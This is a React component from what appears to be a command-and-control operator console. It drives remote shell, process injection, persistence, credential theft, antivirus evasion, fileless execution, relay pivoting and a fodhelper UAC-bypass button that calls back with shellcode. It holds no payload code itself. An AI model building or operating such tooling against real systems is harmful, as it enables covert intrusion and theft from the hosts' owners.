import { useState, useEffect, useRef } from 'react'
import { Monitor, FolderOpen, Cpu, Network, Terminal, Upload, Shield, Camera, KeyRound, ShieldCheck, Zap, MonitorPlay, Share2, X, MoreHorizontal, Layers } from 'lucide-react'
import { format } from 'date-fns'
import type { Session } from '../types'
import { FileManager } from './FileManager'
import { ProcessList } from './ProcessList'
import { ProcessInjectionTab } from './ProcessInjection'
import { TerminalComponent } from './Terminal'
import { PersistencePanel } from './PersistencePanel'
import { ScreenshotPanel } from './ScreenshotPanel'
import { CredentialsPanel } from './CredentialsPanel'
import { AVDetectTab } from './AVDetectTab'
import { AVOpsPanel } from './AVOpsPanel'
import { FilelessExecPanel } from './FilelessExecPanel'
import { ScreenStreamPanel } from './ScreenStreamPanel'
import { RelayPanel } from './RelayPanel'
import { pluginApi, sessionApi } from '../api'
import { Badge } from './ui'
import './SessionDetail.css'

export type DetailTab = 'info' | 'files' | 'process' | 'injection' | 'shell' | 'bof' | 'persistence' | 'screenshot' | 'credentials' | 'av' | 'avops' | 'fileless' | 'screenstream' | 'relay'

interface SessionDetailProps {
  session: Session
  onClose: () => void
}

const TABS: { key: DetailTab; icon: React.ReactNode; label: string }[] = [
  { key: 'info', icon: <Monitor size={14} />, label: '信息' },
  { key: 'files', icon: <FolderOpen size={14} />, label: '文件' },
  { key: 'process', icon: <Cpu size={14} />, label: '进程' },
  { key: 'injection', icon: <Network size={14} />, label: '注入' },
  { key: 'shell', icon: <Terminal size={14} />, label: 'Shell' },
  { key: 'bof', icon: <Upload size={14} />, label: '插件' },
  { key: 'persistence', icon: <Shield size={14} />, label: '持久化' },
  { key: 'screenshot', icon: <Camera size={14} />, label: '截图' },
  { key: 'credentials', icon: <KeyRound size={14} />, label: '凭据' },
  { key: 'av', icon: <ShieldCheck size={14} />, label: '杀软' },
  // 杀软对抗分级（AV-Ops，v1.4.0 S6）：分级目录 + 逐动作可用性 + 二次确认下发。
  // 与上面的「杀软」面板并存：那个是既有裸链（无分级、无前置检查、不写审计），这个是分级入口。
  { key: 'avops', icon: <Layers size={14} />, label: '对抗分级' },
  { key: 'fileless', icon: <Zap size={14} />, label: '内存' },
  { key: 'screenstream', icon: <MonitorPlay size={14} />, label: '屏幕流' },
  { key: 'relay', icon: <Share2 size={14} />, label: '中继' },
]

// 常驻显示的 tab（高频：看信息、传文件、看进程、开 Shell、跑内存执行）
const PINNED_TABS: DetailTab[] = ['info', 'files', 'process', 'shell', 'fileless']
// 「更多」下拉里的分组顺序（只影响收纳后的展示顺序，不改任何功能）
const TAB_GROUPS: { title: string; keys: DetailTab[] }[] = [
  { title: '执行与注入', keys: ['injection', 'bof'] },
  { title: '环境与对抗', keys: ['av', 'avops', 'credentials', 'persistence'] },
  { title: '屏幕', keys: ['screenshot', 'screenstream'] },
  { title: '网络', keys: ['relay'] },
]

export function SessionDetail({ session, onClose }: SessionDetailProps) {
  const [activeTab, setActiveTab] = useState<DetailTab>('info')
  // 「更多」下拉的展开状态（tab 太多时收纳用）
  const [moreOpen, setMoreOpen] = useState(false)
  // 下拉用 fixed 定位：按按钮实测坐标计算（top / 距右侧距离），避免被 tab 条的 overflow 裁掉
  const [menuPos, setMenuPos] = useState<{ top: number; right: number }>({ top: 0, right: 0 })
  const tabsRef = useRef<HTMLDivElement | null>(null)
  const moreBtnRef = useRef<HTMLButtonElement | null>(null)
  // 服务端能力清单（tabs 白名单）；未加载时用本地 OS 推导兜底
  const [capTabs, setCapTabs] = useState<Record<string, boolean> | null>(null)

  useEffect(() => {
    setCapTabs(null)
    sessionApi
      .getCapabilities(session.id)
      .then((r) => r.data?.tabs && setCapTabs(r.data.tabs))
      .catch(() => setCapTabs(null))
  }, [session.id])

  const getStatusBadge = (status: string) => {
    const statusMap: Record<string, { label: string; class: string }> = {
      active: { label: '活跃', class: 'success' },
      dead: { label: '离线', class: 'danger' },
      sleep: { label: '休眠', class: 'warning' },
    }
    return statusMap[status] || { label: status, class: '' }
  }

  // 按操作系统过滤功能 tab：Windows 全功能；
  // Linux/macOS 仅显示通用能力（信息/文件/进程/Shell/插件/中继/内存）；
  // 未知 OS 显示基础四项。优先使用服务端 capabilities 清单。
  const isWindows = session.os?.toLowerCase().includes('windows')
  const isLinux = session.os?.toLowerCase().includes('linux')
  const isMac = session.os?.toLowerCase().includes('darwin')

  const availableTabs = TABS.filter((tab) => {
    // AV-Ops 面板（v1.4.0 S6）是**前端新增的面板**：服务端 capabilities 的 tabs 白名单
    // （Go 侧 internal/common/features 的 tab 表）里没有 'avops' 这个键，所以它的可用性
    // 跟随「杀软」面板。面板自己会处理接口 404/403（老服务端没有 /av-ops 时给说明而不是白屏）。
    if (tab.key === 'avops') return capTabs ? capTabs.av === true : isWindows
    // 服务端清单优先（capTabs[key] === true）
    if (capTabs) return capTabs[tab.key] === true
    if (isWindows) return true // Windows：全部
    if (isLinux || isMac) {
      // Unix 系：通用能力
      const unixTabs: DetailTab[] = ['info', 'files', 'process', 'shell', 'bof', 'fileless', 'relay']
      return unixTabs.includes(tab.key)
    }
    // 未知 OS：基础四项
    const baseTabs: DetailTab[] = ['info', 'files', 'process', 'shell']
    return baseTabs.includes(tab.key)
  })

  // activeTab 被过滤掉时自动回退到 'info'（避免渲染不存在的面板）
  const effectiveTab = availableTabs.some((t) => t.key === activeTab) ? activeTab : 'info'

  // 常驻 tab + 收纳 tab：**当前选中的 tab 永远放进可见区**（否则切到"更多"里的功能后
  // 看不出自己在哪一页）。菜单里仍然列出全部被收纳项（当前项高亮），计数不随选择变化。
  const pinnedSet = new Set<DetailTab>(PINNED_TABS)
  const overflowTabs = availableTabs.filter((t) => !pinnedSet.has(t.key))
  const visibleTabs = availableTabs.filter(
    (t) => pinnedSet.has(t.key) || t.key === effectiveTab,
  )

  // 点空白处 / Esc 关闭「更多」下拉；打开与窗口变化时重算下拉坐标
  useEffect(() => {
    if (!moreOpen) return
    const place = () => {
      const el = moreBtnRef.current
      if (!el) return
      const r = el.getBoundingClientRect()
      setMenuPos({ top: r.bottom + 6, right: Math.max(8, window.innerWidth - r.right) })
    }
    place()
    const onDown = (e: MouseEvent) => {
      const t = e.target as Node
      // 点在按钮或菜单里都不关闭（菜单项自己会关）
      if (moreBtnRef.current?.contains(t)) return
      if (tabsRef.current && tabsRef.current.querySelector('.detail-tabs-menu')?.contains(t)) return
      setMoreOpen(false)
    }
    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') setMoreOpen(false)
    }
    document.addEventListener('mousedown', onDown)
    document.addEventListener('keydown', onKey)
    window.addEventListener('resize', place)
    window.addEventListener('scroll', place, true)
    return () => {
      document.removeEventListener('mousedown', onDown)
      document.removeEventListener('keydown', onKey)
      window.removeEventListener('resize', place)
      window.removeEventListener('scroll', place, true)
    }
  }, [moreOpen])

  // Esc 关闭详情面板（与「更多」下拉的 Esc 不冲突：下拉关闭后事件仍冒泡，这里只在没有下拉时生效）
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && !moreOpen) onClose()
    }
    document.addEventListener('keydown', onKey)
    return () => document.removeEventListener('keydown', onKey)
  }, [moreOpen, onClose])

  return (
    <div className="session-detail-panel">
      <div className="detail-header">
        <div style={{ minWidth: 0 }}>
          <div className="detail-title">
            <Monitor size={20} />
            <h3>{session.hostname}</h3>
            <Badge tone={session.status === 'active' ? 'ok' : session.status === 'sleep' ? 'warn' : 'danger'}>
              <span className="ui-dot" />
              {getStatusBadge(session.status || '').label}
            </Badge>
          </div>
          {/* 次要信息：面板顶部就能看出"这是哪台机器、什么系统、地址是什么" */}
          <div className="detail-meta">
            <span>{session.os || '未知系统'}{session.arch ? ` / ${session.arch}` : ''}</span>
            {(session as { remote_addr?: string }).remote_addr && (
              <span>· {(session as { remote_addr?: string }).remote_addr}</span>
            )}
            {session.process_name && <span>· {session.process_name}</span>}
            {session.username && <span>· {session.username}</span>}
          </div>
        </div>
        <button className="close-btn" onClick={onClose} title="关闭详情（Esc）">
          <X size={18} />
        </button>
      </div>

      {/* tab 条：常用 tab 固定显示，其余收进「更多」下拉（按功能分组）。
          Windows 会话最多 13 个 tab，窄面板里单行横滚等于"把 tab 藏起来"（看不出还能滚），
          所以这里改成显式收纳：当前选中的 tab 永远出现在可见区。 */}
      <div className="detail-tabs" ref={tabsRef}>
        {visibleTabs.map((tab) => (
          <button
            key={tab.key}
            className={`tab-btn ${effectiveTab === tab.key ? 'active' : ''}`}
            onClick={() => setActiveTab(tab.key)}
            title={tab.label}
          >
            {tab.icon} {tab.label}
          </button>
        ))}

        {overflowTabs.length > 0 && (
          <div className="detail-tabs-more">
            <button
              ref={moreBtnRef}
              className={`tab-btn tab-more-btn ${overflowTabs.some((t) => t.key === effectiveTab) ? 'active' : ''}`}
              onClick={() => setMoreOpen((v) => !v)}
              title="更多功能"
              aria-expanded={moreOpen}
            >
              <MoreHorizontal size={14} /> 更多
              <span className="tab-more-count">{overflowTabs.length}</span>
            </button>
            {moreOpen && (
              <div
                className="detail-tabs-menu"
                role="menu"
                /* fixed 定位 + 按按钮实测坐标计算：tab 条本身有 overflow（窄屏滚动兜底），
                   绝对定位的下拉会被它裁掉（用户反馈"更多点不出来"就是这个原因）。
                   fixed 定位不受任何祖先 overflow 影响。 */
                style={{ top: menuPos.top, right: menuPos.right }}
              >
                {TAB_GROUPS.map((group) => {
                  const items = group.keys
                    .map((k) => overflowTabs.find((t) => t.key === k))
                    .filter((t): t is (typeof overflowTabs)[number] => !!t)
                  if (items.length === 0) return null
                  return (
                    <div key={group.title} className="detail-tabs-menu-group">
                      <div className="detail-tabs-menu-title">{group.title}</div>
                      {items.map((tab) => (
                        <button
                          key={tab.key}
                          className={`detail-tabs-menu-item ${effectiveTab === tab.key ? 'active' : ''}`}
                          onClick={() => {
                            setActiveTab(tab.key)
                            setMoreOpen(false)
                          }}
                          role="menuitem"
                        >
                          {tab.icon} {tab.label}
                        </button>
                      ))}
                    </div>
                  )
                })}
              </div>
            )}
          </div>
        )}
      </div>

      <div className="detail-content">
        {effectiveTab === 'info' && <SessionInfoTab session={session} />}
        {effectiveTab === 'files' && <FileManager session={session} />}
        {effectiveTab === 'process' && <ProcessList session={session} />}
        {effectiveTab === 'injection' && <ProcessInjectionTab session={session} />}
        {effectiveTab === 'shell' && (
          <TerminalComponent
            wsPath={`/api/v1/sessions/${session.id}/shell`}
            title={`Shell - ${session.hostname}`}
            titleHighlight={session.hostname}
            sessionId={session.id}
            showNewTab
          />
        )}
        {effectiveTab === 'bof' && <SessionPluginTab session={session} />}
        {effectiveTab === 'persistence' && <PersistencePanel session={session} />}
        {effectiveTab === 'screenshot' && <ScreenshotPanel session={session} />}
        {effectiveTab === 'credentials' && <CredentialsPanel session={session} />}
        {effectiveTab === 'av' && <AVDetectTab session={session} />}
        {effectiveTab === 'avops' && <AVOpsPanel session={session} />}
        {effectiveTab === 'fileless' && <FilelessExecPanel session={session} />}
        {effectiveTab === 'screenstream' && <ScreenStreamPanel session={session} />}
        {effectiveTab === 'relay' && <RelayPanel session={session} />}
      </div>
    </div>
  )
}

/** Session 信息 Tab */
function SessionInfoTab({ session }: { session: Session }) {
  const [comment, setComment] = useState(session.comment || '')
  const [uacBusy, setUacBusy] = useState(false)
  const [uacMsg, setUacMsg] = useState('')

  const runUAC = async () => {
    setUacBusy(true)
    setUacMsg('')
    try {
      const r = await sessionApi.privescUAC(session.id)
      setUacMsg(r.data?.message || '提权任务已下发（等待新会话上线）')
    } catch (e: any) {
      setUacMsg('提权失败: ' + (e?.response?.data?.error || (e instanceof Error ? e.message : String(e))))
    } finally {
      setUacBusy(false)
    }
  }

  return (
    <div className="info-tab">
      <div className="info-grid">
        <div className="info-item">
          <span className="info-label">会话ID</span>
          <span className="info-value mono">{session.id}</span>
        </div>
        <div className="info-item">
          <span className="info-label">主机名</span>
          <span className="info-value">{session.hostname}</span>
        </div>
        <div className="info-item">
          <span className="info-label">用户名</span>
          <span className="info-value">{session.username}</span>
        </div>
        <div className="info-item">
          <span className="info-label">域</span>
          <span className="info-value">{session.domain || '-'}</span>
        </div>
        <div className="info-item">
          <span className="info-label">操作系统</span>
          <span className="info-value">{session.os}</span>
        </div>
        <div className="info-item">
          <span className="info-label">架构</span>
          <span className="info-value">{session.arch}</span>
        </div>
        <div className="info-item">
          <span className="info-label">PID</span>
          <span className="info-value mono">{session.pid || '-'}</span>
        </div>
        <div className="info-item">
          <span className="info-label">进程名</span>
          <span className="info-value mono">{session.process_name || '-'}</span>
        </div>
        <div className="info-item">
          <span className="info-label">远程地址</span>
          <span className="info-value mono">{session.remote_addr || '-'}</span>
        </div>
        <div className="info-item">
          <span className="info-label">监听器</span>
          <span className="info-value">{session.listener || '-'}</span>
        </div>
        <div className="info-item full">
          <span className="info-label">链路</span>
          <span
            className="info-value"
            style={{ color: session.listener?.startsWith('relay') ? '#b48cff' : undefined }}
          >
            {session.listener?.startsWith('relay')
              ? `经中继链回连 · ${session.listener === 'relay' ? 1 : parseInt(session.listener.slice(5)) || 1} 跳${session.parent_relay ? ` · 父中继: ${session.parent_relay}` : ''}`
              : '直连团队服务器'}
          </span>
        </div>
        <div className="info-item full">
          <span className="info-label">IP地址</span>
          <span className="info-value mono">
            {session.ip_addresses?.join(', ') || '-'}
          </span>
        </div>
        <div className="info-item">
          <span className="info-label">首次上线</span>
          <span className="info-value">
            {session.first_seen
              ? format(new Date(session.first_seen), 'yyyy-MM-dd HH:mm:ss')
              : '-'}
          </span>
        </div>
        <div className="info-item">
          <span className="info-label">最后活动</span>
          <span className="info-value">
            {session.last_seen
              ? format(new Date(session.last_seen), 'yyyy-MM-dd HH:mm:ss')
              : '-'}
          </span>
        </div>
        <div className="info-item full">
          <span className="info-label">备注</span>
          <input
            type="text"
            className="comment-input"
            value={comment}
            onChange={(e) => setComment(e.target.value)}
            placeholder="为该会话添加备注..."
          />
        </div>
        {session.os === 'windows' && (
          <div className="info-item full">
            <span className="info-label">提权</span>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, flexWrap: 'wrap' }}>
              <button className="btn-small btn-primary" onClick={runUAC} disabled={uacBusy} title="fodhelper UAC 绕过：以高完整性内存执行 shellcode 回连上线（需会话为管理员权限）">
                <Zap size={13} /> {uacBusy ? '提权中...' : 'UAC 提权（内存执行并上线）'}
              </button>
              {uacMsg && <span style={{ fontSize: 12, color: 'var(--text-dim, #9a9aab)' }}>{uacMsg}</span>}
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

/** Session 插件 Tab（内联实现，避免额外依赖） */
function SessionPluginTab({ session }: { session: Session }) {
  const [plugins, setPlugins] = useState<
    { id: string; name: string; type: string; size: number }[]
  >([])
  const [selectedPlugin, setSelectedPlugin] = useState('')
  const [args, setArgs] = useState('')
  const [loading, setLoading] = useState(false)
  const [output, setOutput] = useState('')

  useEffect(() => {
    fetchPlugins()
  }, [])

  const fetchPlugins = async () => {
    try {
      const response = await fetch('/api/v1/plugins', {
        headers: {
          Authorization: `Bearer ${localStorage.getItem('toshell-token')}`,
        },
      })
      const data = await response.json()
      setPlugins(data.plugins || [])
    } catch (error) {
      console.error('Failed to fetch plugins:', error)
    }
  }

  const pollTaskResult = async (taskId: number): Promise<string | null> => {
    // 动态轮询间隔：前几次快速探测，之后拉长，减少无效请求
    const intervals = [0, 200, 300, 500, 1000, 2000]
    for (let i = 0; i < 60; i++) {
      try {
        const response = await fetch(`/api/v1/tasks/${taskId}`, {
          headers: {
            Authorization: `Bearer ${localStorage.getItem('toshell-token')}`,
          },
        })
        const task = await response.json()
        if (task.status === 'completed') return task.output
        if (task.status === 'failed') return task.error || '执行失败'
      } catch (e) {}
      await new Promise((r) => setTimeout(r, intervals[Math.min(i, intervals.length - 1)]))
    }
    return '执行超时'
  }

  const handleExecute = async () => {
    if (!selectedPlugin) return
    setLoading(true)
    const plugin = plugins.find((p) => p.id === selectedPlugin)
    setOutput(
      `正在加载插件: ${plugin?.name || selectedPlugin}\n类型: ${plugin?.type || 'unknown'}\n参数: ${args || '(无)'}\n\n正在执行...`
    )
    try {
      const response = await pluginApi.load(session.id, selectedPlugin, args)
      if (response?.data?.task_id) {
        const result = await pollTaskResult(response.data.task_id)
        if (result) {
          setOutput((prev) => prev + '\n\n执行完成!\n输出:\n' + result)
        } else {
          setOutput((prev) => prev + '\n\n执行失败')
        }
      }
    } catch (error: any) {
      setOutput(
        (prev) =>
          prev +
          '\n\n错误: ' +
          (error.response?.data?.error || error.message)
      )
    } finally {
      setLoading(false)
    }
  }

  const formatSize = (bytes: number) => {
    if (bytes < 1024) return bytes + ' B'
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(2) + ' KB'
    return (bytes / (1024 * 1024)).toFixed(2) + ' MB'
  }

  return (
    <div className="plugin-tab">
      <div className="plugin-select">
        <label>选择插件:</label>
        <select
          value={selectedPlugin}
          onChange={(e) => setSelectedPlugin(e.target.value)}
        >
          <option value="">-- 请选择插件 --</option>
          {plugins.map((p) => (
            <option key={p.id} value={p.id}>
              {p.name} ({p.type.toUpperCase()}, {formatSize(p.size)})
            </option>
          ))}
        </select>
        <button className="btn-small" onClick={fetchPlugins}>
          <svg
            width="14"
            height="14"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
          >
            <path d="M23 4v6h-6M1 20v-6h6M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15" />
          </svg>
        </button>
      </div>
      <div className="plugin-args">
        <label>参数 (可选):</label>
        <input
          type="text"
          value={args}
          onChange={(e) => setArgs(e.target.value)}
          placeholder="插件参数..."
        />
      </div>
      <button
        className="btn-primary"
        onClick={handleExecute}
        disabled={!selectedPlugin || loading}
      >
        {loading ? '执行中...' : '执行插件'}
      </button>
      <div className="plugin-output">
        <pre>{output || '插件执行输出将显示在这里...'}</pre>
      </div>
    </div>
  )
}
